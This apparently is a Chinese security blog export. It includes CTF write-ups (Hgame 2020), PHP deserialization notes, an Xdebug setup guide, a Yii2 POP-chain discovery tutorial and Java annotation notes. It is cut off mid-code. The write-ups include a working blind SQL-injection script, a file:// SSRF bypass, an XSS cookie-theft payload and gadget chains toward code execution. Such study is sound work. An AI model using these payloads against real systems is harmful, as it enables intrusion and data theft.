isset($_POST[&apos;password&apos;])) { if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username){ $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;]; header(&quot;Location: admin.php&quot;); exit(); } else { echo &quot;??¨??·???????ˉ?? ?é??èˉˉ&quot;; } } } ?&gt;index.php &lt;?php error_reporting(0); session_start(); if(isset($_SESSION[&apos;username&apos;])) { header(&quot;Location: admin.php&quot;); exit(); } $action = @$_GET[&apos;action&apos;]; $filter = &quot;/config|etc|flag/i&quot;; if (isset($_GET[&apos;action&apos;]) &amp;&amp; !empty($_GET[&apos;action&apos;])) { if(preg_match($filter, $_GET[&apos;action&apos;])) { echo &quot;Hacker get out!&quot;; exit(); } include $action; } elseif(!isset($_GET[&apos;action&apos;]) || empty($_GET[&apos;action&apos;])) { header(&quot;Location: ?action=login.php&quot;); exit(); }admin.php &lt;?php include &quot;config.php&quot;; session_start(); if(!isset($_SESSION[&apos;username&apos;])) { header(&apos;Location: index.php&apos;); exit(); } function insert_img() { if (isset($_POST[&apos;img_url&apos;])) { $img_url = @$_POST[&apos;img_url&apos;]; $url_array = parse_url($img_url); if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) { return false; } $c = curl_init(); curl_setopt($c, CURLOPT_URL, $img_url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($c); curl_close($c); $avatar = base64_encode($res); if(filter_var($img_url, FILTER_VALIDATE_URL)) { return $avatar; } } else { return base64_encode(file_get_contents(&quot;static/logo.png&quot;)); } } ?&gt; &lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;可以看到，从index.php的文件包含来获取flag是不太可能了，只能找其它方法。在admin.php中我们可以看到有一个利用base64来读取远程和本地图片的脚本。或许我们可以对其进行利用。但首先我们需要用管理员账号登录上去。随后便可以找到登录验证的代码： if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username) { $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;]; header(&quot;Location: admin.php&quot;); exit(); } else { echo &quot;??¨??·???????ˉ?? ?é??èˉˉ&quot;; }这样，我们就要想办法得到两个变量的值$admin_password，admin_username。还不难注意到在login.php中有一个debug-mode，只要输入变量，他就会执行eval(“var_dump($$debug);”);来显示变量。这正是我们需要的。得到了账号和md5后的密码： username:Cosmos! MD5(password):0e114902927253523756713132279690可以看到MD5后的密码是0e+数字，且比较时也不是严格比较，所以可以绕过。登录后来到admin.php页面，分析php源码，得到几个重要函数： filter_var($img_url, FILTER_VALIDATE_URL); //这是一个过滤器函数，通过过滤器来返回过滤的部分。 parse_url($img_url); /* 这个函数是将一个url拆解为几个部分，如下的url会被拆解为几个部分： http://username:password@hostname/path?arg=value#anchor Array ( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] =&gt; anchor ) */在admin.php，中有这么一段代码 $img_url = @$_POST[&apos;img_url&apos;]; $url_array = parse_url($img_url); ... if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) { return false; } 它明确要求了文件的host来自localhost或timgsa.baidu.com，否则会导致函数返回false。我们可以使用file协议使条件符合：file://localhost/flagPS：理论上，file协议也是有host部分的，但这个协议本身就是解析本地文件的，所以被省略了。但还是需要注意host部分必须是localhost，否则会出错。PSS：在我windows本地环境中使用以下php脚本： &lt;?php $url = &apos;file://localhost/D:/114514.txt&apos;; print_r(parse_url($url)); $c = curl_init(); curl_setopt($c, CURLOPT_URL, $url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($c); curl_close($c); if(filter_var($url, FILTER_VALIDATE_URL)) { print(&apos;working&apos;); echo $res; } ?&gt; /* Output: Array ( [scheme] =&gt; file [host] =&gt; localhost [path] =&gt; /D:/114514.txt ) working 当$url=&apos;file:///D:/114514.txt&apos;;时 Array ( [scheme] =&gt; file [path] =&gt; /D:/114514.txt ) workingいいよ！こいよ！ */不知道为什么链接解析成功了，但没有114514.txt的文件内容。在5.2.17和7.3.4的环境都试过了，都不行…但在题目中使用file://localhost/flag是可以得到文件内容的…总之得到了flag： hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}Cosmos的留言板-1考察点sql时间盲注（或许？ 过程说来丢人，这道题最开始手注了很长时间，一直都没有成功。无奈之下使用了sqlmap，发现可以使用时间盲注。这道题过滤了select和空格，不过不是大问题，select大写或双写绕过、空格用/**/绕过。但让我费解的是#和--+虽然没有被过滤，但似乎并没有被sql解析…不知道为什么。不过还是有办法的，用AND/**/'1即可。那不多说了，直接上脚本： import requests mode = input(&quot;plz input use mode:&quot;) while(True): if(mode == &apos;T&apos;): payload = &apos;1\\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(TABLE_NAME)/**/FROM/**/information_schema.TABLES/**/WHERE/**/TABLE_SCHEMA=database()),%s,1))=%s),sleep(10),1))/**/AND/**/\\&apos;1&apos; break elif(mode == &apos;C&apos;): tab = input(&apos;plz input tables_name:&apos;) payload = &apos;1\\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(COLUMN_NAME)/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\\&apos;1&apos; break elif(mode == &apos;F&apos;): tab = input(&apos;plz input tables_name:&apos;) col = input(&apos;plz input col_name:&apos;) payload = &apos;1\\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/&apos;+ col +&apos;/**/FROM/**/&apos;+ tab +&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\\&apos;1&apos; break elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;): print(&apos;Error&apos;) url = &apos;http://139.199.182.61/index.php?id=&apos; res = &apos;&apos; sel_num = input(&quot;plz input sel_num:&quot;) for i in range(1,int(sel_num)): print(i) for j in range(32,127): now_payload = payload % (i,j) now_url = url + now_payload try: r = requests.get(url=now_url,timeout=4.5) except: res += chr(j) print(res) break print(res) a = input(&quot;按任意键退出&quot;) exit() # 查到两个表：f1aggggggggggggg,messages # flag表中只有一列：fl4444444g # 得到flag：hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}PS：这个脚本是我根据swpuctf的脚本改编的，修正了上一个脚本的小错误（顺便小小优化了一下代码，避免没必要的操作。 hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}Cosmos的新语言考察点脚本编写 过程这道题就是写脚本，首先在主页中可以看到一串变换的字符串，在./mycode中就知道这是token加密后的密文。只有当post的token和服务器的token对应即可获得flag。比较坑的一点是，只有深入尝试后才能知道这道题变化的不只有token，还有加密方式。8说了，上我辣鸡的python脚本： import base64 import requests import re import codecs catchPasswd = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;).text) # 得密文 catchCrypt = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/mycode&quot;).text) # 得加密方法 catchPasswd = re.sub(r&apos;(^.*\\s)(.*\\s)&lt;/span&gt;(.*\\s)&lt;/code&gt;&lt;br&gt;.*\\s&apos;, &quot;&quot;, catchPasswd) catchPasswd = re.sub(r&apos;&lt;br&gt;(.*\\s)(.*\\s)(.*\\s)&lt;/html&gt;&apos;, &quot;&quot;, catchPasswd) # 正则消去无用部分 catchCrypt = re.sub(r&apos;(.*\\s)(.*\\s)(.*\\s)echo\\(&apos;, &quot;&quot;, catchCrypt) catchCrypt = re.sub(r&apos;function(.*\\s)(.*\\s)(.*\\s)(.*\\s)(.*\\s)&apos;, &quot;&quot;, catchCrypt) catchCrypt = re.sub(r&apos;\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);(.*\\s).*\\s}&apos;, &quot;&quot;, catchCrypt) # 令人智熄的正则（（（ crypt = catchCrypt.split(&quot;(&quot;, 10) # 以‘(’为界限，把字符串分割 passwd = catchPasswd def strrev(string): result = &apos;&apos;.join(reversed(string)) return str(result) def decrypt(string): result = &apos;&apos; for i in range(0,len(string)): result += chr(ord(string[i]) - 1) return str(result) def base64_decode(string): result = base64.b64decode(string).decode(&apos;utf-8&apos;) return str(result) def str_rot13(string): result = codecs.getencoder(&quot;rot-13&quot;)(string) return result[0] # 各个加密的函数 for i in range(0, 10): if(crypt[i] == &apos;strrev&apos;): passwd = strrev(passwd) elif(crypt[i] == &apos;str_rot13&apos;): passwd = str_rot13(passwd) elif(crypt[i] == &apos;base64_encode&apos;): passwd = base64_decode(passwd) elif(crypt[i] == &apos;encrypt&apos;): passwd = decrypt(passwd) # 解密部分，因为固定加密10次，所以循环判断10次即可 send = requests.post(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;, data={&apos;token&apos; : passwd }) print(send.text) # 打印输送token后得到的网页得到flag： hgame{5!MPLe-$criPT~WITh_pyThon~OR~PHp}Cosmos的聊天室考察点XSSmd5截断验证 过程这道题的过滤方式很有趣：1.循环过滤&lt;&gt;以及其之间的所有字符2.script会变为HI THERE!3.所有的字符大写不过即使如此也可以进行XSS &lt;img src=1 onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&apos;&lt; &lt;!- 即：&lt;img src=1 onerror=&apos;alert(1)&apos;&gt; -&gt;1.根据html不严谨的语法规则，即使没有&gt;封闭语句也可以正常显示PS：后端的python代码好像还帮忙补全了后面的&lt;（（（2.使用img标签和onerror事件来避免使用script字符串3.使用实体编码&amp;#(ascii十进制);来规避字符的大写这样就可以盗取管理员的cookie来查看flag了还有，关于实体编码网上还没有可以直接白嫖的，自己拿C瞎打了一个（感觉用C更简单（bin选手憋喷我（ #include &lt;stdio.h&gt; int main() { char a=0; while(1) { scanf(&quot;%c&quot;, &amp;a); if(a != 0x0A) printf(&quot;&amp;#%d;&quot;, a); } return 0; }另外，想让管理bot点击页面，还需要发送一段md5截断验证这里直接给白嫖的python脚本（还是多线程的： import hashlib from multiprocessing.dummy import Pool as ThreadPool def md5(s): # 计算MD5字符串 return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest() keymd5 = input(&quot;set:&quot;) md5start = 0 md5length = 6 def findmd5(sss): #已知的md5截断值 # 设置题目已知的截断位置 # 输入范围 里面会进行md5测试 key = sss.split(&apos;:&apos;) start = int(key[0]) end = int(key[1]) # 开始位置 # 结束位置 result = 0 for i in range(start, end): if md5(i)[0:6] == keymd5: result = i print(result) break list=[] # 参数列表 for i in range(10): pool = ThreadPool() # 打印 # 拿到加密字符串 # 多线程的数字列表 开始与结尾 list.append(str(100000000*i) + &apos;:&apos; + str(100000000*(i+1))) # 多线程任务 pool.map(findmd5, list) # 函数 与参数列表 pool.close() pool.join()得到token：f802788a02a51f9c624bb5d91815b得到flag： hgame{xsS_1s_r3a11y_inTeresT1ng!!}","link":"/2020/02/24/%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%9A%84Hgame2020-CTF%E7%9A%84WP/"},{"title":"网鼎杯2020-小知识点","text":"前言在网鼎杯中遇见了许多令人迷惑的问题、以及不知道的知识，故在此记录。 php反序列化中对象属性问题在这次的一道php反序列化的一道题中。我们要利用的属性被设置为了protected，这意味着我们的序列化字符串中将会出现%00这个不可见字符，但题目中ban掉了所有不可见字符，需要进行绕过。 我正当想着怎么绕过，突然有师傅说不必理会那个%00，利用的属性直接按照public得到的序列化字符串也可以被利用。当时的我：？？？？？？？我之前的一道ctf中，因为没有注意到某一个属性的可见性是private导致痛失一题。 故在这里尝试不同版本php的反序列化处理尝试以下代码 &lt;?php echo phpversion().&apos;&lt;br&gt;&apos;; class test { public $a; private $b; protected $c; public function __construct() { $this-&gt;a = 1; $this-&gt;b = 2; $this-&gt;c = 3; } private function outputAll() { echo &apos;a:&apos;.$this-&gt;a.&apos;&lt;br&gt;&apos;; echo &apos;b:&apos;.$this-&gt;b.&apos;&lt;br&gt;&apos;; echo &apos;c:&apos;.$this-&gt;c; } public function __destruct() { $this-&gt;outputAll(); } } if(isset($_GET[&apos;str&apos;])) $obj = unserialize($_GET[&apos;str&apos;]); else { $obj = new test; echo serialize($obj); }环境为linux加apache2设置get参数为str=O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;s:1:&quot;c&quot;;i:3;}分别获得以下输出 php:7.4-apache: 7.4.5&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3 php:7.3-apache: 7.3.17&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3 php:7.2-apache: 7.2.30&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3 php:7.1-apache: 7.1.33&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c: php:7.0-apache: 7.0.33&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c: php:5.6-apache: 5.6.40&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c:可以看到，在7.2以后的版本（包括7.2）php在进行反序列化处理时并没有对属性的可见性进行检验这便是矛盾的来源，之后在进行反序列化时，一定要注意php的版本，这上述的情况可能会带来意想不到的漏洞。 php反序列化中的S类型在一个对象被序列化后的字符串中的字符有特殊的含意O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;s:1:&quot;c&quot;;i:3;}在上面的字符串中，O为对象、s为字符串、i为数字…这里要讲一种S类型，S类型指的是是已经被转义的字符串在一个private或protected的对象属性中，序列化后，会有特殊的字符 以上面的代码为例（PS：%00为hex值为00的字符）序列化b为：s:7:&quot;%00test%00b&quot;;i:2;序列化c为：s:4:&quot;%00*%00c&quot;;i:3;可以看到，当在浏览器这么输入后，会向服务器发送不可见字符。 但对于S类型则没有必要了，将s替换为S后：序列化b为：S:7:&quot;\\00test\\00b&quot;;i:2;序列化c为：S:4:&quot;\\00*\\00c&quot;;i:3;这样传入的是3个字符组成的字符串\\00而不是00这个不可见字符 这么做的目的其实在这次的CTF便可以见得。有时候，服务器会BAN掉不可见的字符，防止这些字符导致系统错误。但对于php的反序列化字符串来说，S类型恰好绕过了这个限制。 后言目前就学到这么多（，之后靠复现来学习吧。当时java的xxe试了半天没有出网，还以为payload的锅，结果复现发现一模一样的payload，buuoj可以出网（指靶机内网）。不知道为什么脑壳痛（还有就是吐槽一下那个/web那个目录有点坑（以后先尝试去读一下httpd.confPS：php真是博大精深（（（","link":"/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"title":"记一次远程调试","text":"前言docker for windows就是一个**(无能狂怒)，想build一个环境复现，结果build不起来，无奈使用vps上的docker for linux进行远程调试。这里记录一下如何进行远程调试。 环境1[win10]-①-&gt;[debian8-②-&gt;[docker]] 本地环境为win10系统，使用vscode。远程环境为debian8，拥有公网，开启一个docker容器暴露80端口 ssh选择使用ssh作为第①步的链接首先为vscode安装Remote-SSH扩展 安装完毕后，右侧栏会多出一个显示器一样的图标，点进后添加链接 之后进行设置设置 =&gt; 用户 =&gt; 扩展 =&gt; Remote-SSH =&gt; [Config file &amp; Show Login Terminal] 将自己的ssh config file的path填入config file中，虽然vscode会自动寻找config file，但容易出错。出错的原因应该是环境变量设置有问题，但我乱七八糟的环境变量太多了，懒得搞了=。= 之后选上Show Login Terminal选项，可以在终端显示密码的输入提示。虽然可以使用公匙登录，但因为windows的权限设置，如果公匙文件的权限没有严格锁死的话是不允许使用的。所以懒癌发作（ 之后按照vscode的提示设置就好成功连接后，我们就相当于在远程服务器的本地进行操纵了。 launch.json接下来对php进行远程Debug因为php环境是使用Docker环境搭建的，所以在填写launch.json时仍然需要按照远程环境的方法填写。 123456789101112131415{ \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"Listen for XDebug\", \"type\": \"php\", \"request\": \"launch\", \"port\": 9000, //Xdebug的端口 \"stopOnEntry\": true, //程序一进入就暂停，个人喜好，可以去掉 \"pathMappings\": { //远程文件对本地文件的映射 \"/www\": \"${workspaceRoot}\" } } ]} xdebug.ini接下来填写xdebug.ini因为其使用在docker环境，所以有一个专用的host——host.docker.internal来访问到宿主主机 12345678910111213141516171819202122232425262728293031zend_extension=xdebug.so[XDebug];开启调试xdebug.remote_enable = on;详见https://xdebug.org/docs/remote#remote_autostartxdebug.remote_autostart = 1;docker特有，指向宿主主机;2020-7-13更新;host.docker.internal必然是有对应的host才生效;但使用debian的镜像时DNS文件有问题，无法解析;可以尝试172.19.0.1xdebug.remote_host = host.docker.internalxdebug.remote_handler = dbgp;宿主监听的portxdebug.remote_port = 9000;将请求来源的ip作为debug响应地址，这里地址可以确切获得就罢了xdebug.remote_connect_back = 0;ide的关键字，这里时VSCODExdebug.idekey = VSCODExdebug.auto_trace = 1;是否跟踪导入的文件名xdebug.collect_includes = 1xdebug.collect_params = 1xdebug.remote_log = /tmp/xdebug.log Dockerfile在设置dockerfile或者docker-compose的端口时，不必将容器内部的9000端口暴露因为xdebug的本质是由ide来开放9000端口接受xdebug的请求，所以暴露容器的9000端口没有用=。= 最后享受你的debug时光吧！（（（","link":"/2020/07/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"},{"title":"如何挖掘自己的php反序列化链","text":"本文先发于先知社区: https://xz.aliyun.com/t/8082 前言Q:为什么要写这篇文章？ A:RCTF2020中的swoole一题刺激到我了（，那道题找了两天也找不到链。再后来第五空间2020的那个laravel也是找了一天，最后还是靠phpggc做了次脚本小子。我在想为啥我找不到链呢？故有此文。 PS: 虽然写的是一些总结性的东西。但作者也不过找到5条框架的链而已，见识还是太少。希望师傅们多多包涵，加以指正。 简单介绍在使用php的反序列化漏洞前需要两个条件 可以进行反序列化的点 合理的pop chain这一对组合拳形成的反序列化漏洞可以进而造成RCE、文件读写、信息泄露等危害。 本文不会对形成反序列化漏洞的点，进行讲解，其它大师傅已经讲解的十分详细了。这里就我这两天的挖链经历进行一个总结。 总则我在挖链的途中总结出以下两点 变量可控在危险的函数和结构上的可控变量要尽可能的多 扩大影响尽可能的去寻找可以扩大攻击面的结构与方法 我们接下来的pop chain构造便一直基于这两点 寻找起点序列化是将对象的属性进行格式的转换，但不会包括方法。所以如果想要反序列化达成恶意的操作必须需要方法的执行。对于起点来说，我们自然是要找到可以自动调用的方法。常见的可以自动调用的方法便是魔术方法。魔术方法的介绍有很多，这里就不详细介绍了。 目前只有两个魔术方法可以被使用 __destruct __wakeup 其中，最为常用的魔术方法是__destruct，其特性是对象被销毁前被调用。从系统结构的角度讲，其最常见的场景是关闭某些功能。比如关闭文件流，更新数据等。但从反序列化的角度讲，其特殊的使用场景，代表在这个方法内可能会调用类内的其它方法。 而另一个__wakeup方法就不太常用了，其特性是反序列化时进行调用。那么可以想象开发人员在对其进行编写时，可能会将其作为一个“进行反序列化时属性合法性校验的”方法。最经典的就是GuzzleHttp包中的GuzzleHttp\\Psr7\\FnStream类，其内部存在大量变量可控的危险函数。但以下这一个方法就直接避免了这个方法被恶意使用。 1234public function __wakeup(){ throw new \\LogicException('FnStream should never be unserialized');} 当然也不是没有使用了__wakeup的链，只不过从各个方面来讲，__destruct确实更好用一些。 接下来再看一个例子。phpggc是github上的一个项目，其存储着大量反序列化链，可以说是反序列化的武器库。https://github.com/ambionics/phpggc其存储了大量的laravel框架的RCE反序列化链，仔细观察发现一共6条反序列化链，5条都使用了同一个类作为起点，还有一条也间接调用了此类。其便是PendingBroadcast.php下的__destruct方法 1234public function __destruct(){ $this-&gt;events-&gt;dispatch($this-&gt;event);} 为什么这个方法会变成公交车呢？我认为共3点 可自动调用 参数可控 攻击面广自动调用自然不必多说，__destruct方法嘛。但值得注意的是其参数，和结构。我们可以看到$this-&gt;events和$this-&gt;event都是可控的，这意味着我们的链可以有两条走向。其一是将$this-&gt;events赋值为没有dispatch方法的实例，来调用其__call方法。其二是去调用各种类中dispatch方法，如果有的dispatch中有危险的函数或者结构，那就考虑使用它。这样就大幅扩大了我们的攻击面。 跳板挑选所谓的跳板，就是在方法和方法、结构和结构、方法和结构之间的跳跃。 常见的例子是一些字符串函数，例如trim，如果其参数可控，我们将其赋值为存在__toString方法的对象即可调用这个方法。 还有类似于call_user_func($this-&gt;test);或者$test();这种只能调用没有参数的函数的结构。出来简单的调用phpinfo以外，我们也可以考虑将变量赋值为[(new test), &quot;aaa&quot;]这样的一个数组。就可以调用test类中的aaa公共方法。 再者，就是new $test1($test2, $test3);这样的结构也可以调用__construct方法。或者像RCTF2020-swoole一题一样，新建一个PDO对象来进行mysql的load file。 总之，就是不计一切代价扩大链的可能性，为寻找到可以利用的方法提供机会。 终点终点在我看来有两类 危险动态调用 危险函数 动态调用就是像($this-&gt;a)($this-&gt;b)或者$this-&gt;a[0]($this-&gt;b)或者这样的危险动态调用。 危险函数，就是根据目的寻找需要的函数。如要RCE，则寻找类似于call_user_func，array_walk这样的会进行函数调用的函数。如要FW，则寻找file_put_content这样的函数… 实战演练这里稍微讲一讲Yii2框架的链吧。当时搜了一波文章好像也没有。 环境准备我就不详细写了 1composer create-project yiisoft/yii2-app-basic app composer+docker+vscode一把梭 Yii2/RCE1首先全局搜索__destruct和__wakeup这两个魔术方法。可以使用grep命令grep -A 10 -rn &quot;__destruct&quot;。或者直接使用vscode的全局搜索也可。 最后我将其定位在yii\\db\\BatchQueryResult类中的__destruct 123456789101112131415public function __destruct(){ $this-&gt;reset();}public function reset(){ if ($this-&gt;_dataReader !== null) { $this-&gt;_dataReader-&gt;close(); } $this-&gt;_dataReader = null; $this-&gt;_batch = null; $this-&gt;_value = null; $this-&gt;_key = null;} 可以看到，就像我刚才说的一样，这里既可以调用__call方法，也可以调用close方法。 在搜了一波__call方法感觉没戏后，这里我选择调用了close方法全局搜grep -A 10 -rn &quot;function[[:space:]]close&quot;，或者vscode 这里我选择了yii\\web\\DbSession类中的close方法 12345678public function close(){ if ($this-&gt;getIsActive()) { // prepare writeCallback fields before session closes $this-&gt;fields = $this-&gt;composeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); }} 首先调用了父类的getIsActive方法 1234public function getIsActive(){ return session_status() === PHP_SESSION_ACTIVE;} 可以看到其对会话的状态进行了一个判别。这里我意外发现，只有当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。这里我还不知道为什么，希望有师傅可以解答… 这里算是这条链唯一的缺憾了吧…总之返回true后继续调用了接口类yii\\web\\MultiFieldSession的composeFields方法 1234567891011protected function composeFields($id = null, $data = null){ $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : []; if ($id !== null) { $fields['id'] = $id; } if ($data !== null) { $fields['data'] = $data; } return $fields;} 芜湖，发现了个可控的call_user_func，但可惜参数无法控制，传入一个对象为参数的可用函数也不太多。那就像我刚才所说，赋值为[(new test), &quot;aaa&quot;]这样的一个数组。就可以调用test类中的aaa公共方法。 那么有没有这样的公共方法？grep -A 10 -rn &quot;public[[:space:]]function[[:space:]].*\\(\\)&quot;最后我找到了yii\\rest\\IndexAction中的run方法 12345678public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } return $this-&gt;prepareDataProvider();} 这下两个都可控了。 调用栈 Yii2/RCE2因为上一条链受扩展影响，所以打算再找一条这次我定位到\\Symfony\\Component\\String\\UnicodeString的__wakeup类 1234public function __wakeup(){ normalizer_is_normalized($this-&gt;string) ?: $this-&gt;string = normalizer_normalize($this-&gt;string);} 我看了一下normalizer_is_normalized这个函数，其要求参数是字符串。参数又可控，那就调用__toString方法吧。 最后我找到了\\Symfony\\Component\\String\\LazyString的__toString方法 123456789101112public function __toString(){ if (\\is_string($this-&gt;value)) { return $this-&gt;value; } try { return $this-&gt;value = ($this-&gt;value)(); } catch (\\Throwable $e) { //... }} 啊这…结合最后一部分一打不就完事了？喜加一 调用栈 防御策略动态调用与危险函数 在写到动态调用和危险函数时，务必对变量和方法进行回溯。查看变量是否是可控的。 在容许的情况下，使用静态属性进行动态调用可以防止可控变量调用危险函数。 在调用$this-&gt;aaa-&gt;bbb()这样类似的结构前可以利用instanceof进行检查，查看其是否是期望调用的类。 方法 注意尽量少的在魔法方法中写入可以调用大量其它方法的方法。尤其是__destruct和__wakeup。 注意在公共且不需要参数的方法中不要直接调用危险函数和动态调用。 在不需要__wakeup方法且类没必要序列化时，可以考虑使用__wakeup阻止反序列化。 最最最最最重要的不要让unserialize和文件类函数用户可控！！！不要让unserialize和文件类函数用户可控！！！不要让unserialize和文件类函数用户可控！！！ 后言emmm感觉写了一篇水文那就这样，这里放上我fork的phpggc，有想学习上面几条链的师傅可以看看https://github.com/AFKL-CUIT/phpggc如有错误还请指出！","link":"/2020/11/15/%E5%A6%82%E4%BD%95%E6%8C%96%E6%8E%98%E8%87%AA%E5%B7%B1%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"},{"title":"java注解学习","text":"java注解注解的定义和使用1234public @interface MyTest { String[] value(); int id();} 和接口一样的定义，但前面多了一个@ 使用方法 123@MyTestpublic class MyClass {} 元注解字面意思，即最基本的注解。它可以用在其它注解上。元注解有5种 @Retention 保留期作用: 其作用是告诉编译器和JVM被注解的注解的存活期 取值 存活期 RetentionPolicy.SOURCE 只在源码阶段，编译时丢弃 RetentionPolicy.CLASS 编译时保留，但不加载入JVM RetentionPolicy.RUNTIME 编译时保留，加载入JVM，可以获取 @Documented 文档作用: 它的作用是能够将注解中的元素包含到 Javadoc 中去 @Target 限定注解对象作用: 限定注解的对象 取值 对象 ElementType.ANNOTATION_TYPE 可以给一个注解进行注解 ElementType.CONSTRUCTOR 可以给构造方法进行注解 ElementType.FIELD 可以给属性进行注解 ElementType.LOCAL_VARIABLE 可以给局部变量进行注解 ElementType.METHOD 可以给方法进行注解 ElementType.PACKAGE 可以给一个包进行注解 ElementType.PARAMETER 可以给一个方法内的参数进行注解 ElementType.TYPE 可以给一个类型进行注解，比如类、接口、枚举 @Inherited 使注解可以随类继承作用: 使注解可以随类继承 123456789101112import java.lang.annotation.Inherited;@Inheritedpublic @interface MyAnnotation {}@MyAnnotationclass test {}class test2 extends test {} 上例中，test2类也有和test类一样的MyAnnotation注解 @Repeatable 重复使用作用: 对同一类多次打一个注解 123456789101112131415161718192021import java.lang.annotation.Inherited;import java.lang.annotation.Repeatable;public @interface MyAnnotation { role[] value();}@Inherited@Repeatable(MyAnnotation.class)@interface role { String value();}@role(\"富豪\")class father {}@role(\"画家\")@role(\"富二代\")class son extends father {} java内置注解@Deprecated 已抛弃标记过时的类、属性、方法等 在ide里面，会有删除线表示过时方法 @Override 重写不多说了 @SuppressWarnings 阻止警告 @SafeVarargs如果你认为你的方法或者构造方法是类型安全的，那么你也就可以使用@SafeVarargs 来跳过@SuppressWarnings(“unchecked”)检查。 注解的提取注解通过反射提取 123boolean isAnnotationPresent(Class) //是否用了某个注解&lt;A extends Annotation&gt; A getAnnotation(Class) //获取某个注解类Annotation[] getAnnotations() //获取所有注解 自己实现的注解默认不被编译器解析，请加上@Retention(RetentionPolicy.RUNTIME) 123456789101112131415161718192021222324252627282930313233343536373839404142434445import java.lang.annotation.*;import java.util.Arrays;@Inherited@Retention(RetentionPolicy.RUNTIME)public @interface MyAnnotation { role[] value();}@Inherited@Repeatable(MyAnnotation.class)@Retention(RetentionPolicy.RUNTIME)@interface role { String value();}@role(\"富豪\")class father {}@role(\"画家\")@role(\"富二代\")class son extends father {}class test { public static void main(String[] args) { Annotation[] role = son.class.getAnnotations(); System.out.println(Arrays.toString(role)); }}// output/* &gt;&gt;&gt;[ @ysoserial.test.role(value=富豪), @ysoserial.test.MyAnnotation( value=[ @ysoserial.test.role(value=画家), @ysoserial.test.role(value=富二代) ] )]*/ 作用给编译器或者APT用，或者说，取决于自己的想法 将需要检查的方法打上@check，来进行检查 利用注解做路由 异步代码标记 实战下面是一个简单的url路由解析器和定义,文件不多，就5个。带师傅们当个乐就好，主要是去理解其中的含义 RequestMethud.java 123456package RouteTest.RouteRequest;public enum RequestMethod { GET, POST} Request.java 12345678910111213package RouteTest.RouteRequest;import java.lang.annotation.Repeatable;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;@Repeatable(Requests.class)@Retention(RetentionPolicy.RUNTIME)public @interface Request { String path(); RequestMethod[] method();} Requests.java 123456789package RouteTest.RouteRequest;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;@Retention(RetentionPolicy.RUNTIME)public @interface Requests { Request[] value();} Route.java 123456789101112131415161718package RouteTest.Route;import RouteTest.RouteRequest.Request;import static RouteTest.RouteRequest.RequestMethod.*;public class Route { @Request(path=\"/\", method = GET) @Request(path = \"/index\", method = {GET, POST}) public Object index() { return \"index\"; } @Request(path=\"/test\", method = POST) public Object test() { return \"test\"; }} Analysis.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package RouteTest.RouteAnalysis;import RouteTest.Route.Route;import RouteTest.RouteRequest.Request;import RouteTest.RouteRequest.Requests;import java.lang.reflect.Method;import java.util.HashMap;public class Analysis { public HashMap&lt;String, Method&gt; RouteAnalysis() { HashMap&lt;String, Method&gt; urlMap = new HashMap&lt;&gt;(); Route router = new Route(); Method[] r = router.getClass().getDeclaredMethods(); for (Method m : r) { Request req = getRequest(m); if (req != null) { urlMap.put(req.path(), m); } Requests reqs = getRequests(m); if (reqs != null) { for (Request 